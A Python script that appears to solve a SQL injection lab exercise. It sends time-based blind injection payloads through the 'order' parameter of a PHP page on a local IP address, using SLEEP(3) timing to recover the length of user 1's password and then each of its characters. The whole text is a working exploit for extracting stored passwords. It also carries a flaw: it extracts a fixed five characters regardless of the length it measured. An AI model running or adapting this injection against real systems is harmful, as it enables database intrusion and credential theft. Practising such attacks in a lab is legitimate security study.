import requests

ip = '192.168.1.58'

def get(payload: str):
    url = f'http://{ip}/sqli/example8.php?order=id`,({payload}) -- `'
    print(f'GET {url}')
    return requests.get(url)

password_length = 1
while True:
    sql = f'SELECT sleep(3) FROM dual WHERE LENGTH((SELECT passwd FROM users WHERE id=1))={password_length}'
    response = get(sql)

    if response.elapsed.seconds >= 3 and response.ok:
        print(f'Success: waited for {response.elapsed.seconds} s')
        break
    password_length += 1

print("Password lenght is:", password_length)

password = []
for i in range(5):
    for c in range(256):
        sql = f'SELECT sleep(3) FROM dual WHERE ASCII(SUBSTRING((SELECT passwd FROM users WHERE id=1), {i + 1}, 1))={c}'
        response = get(sql)

        if response.elapsed.seconds >= 3 and response.ok:
            print(f'Success [{i + 1}]: waited for {response.elapsed.seconds} s')
            password.append(c)
            break

print("Password is: '" + ''.join(map(chr, password)) + "'")
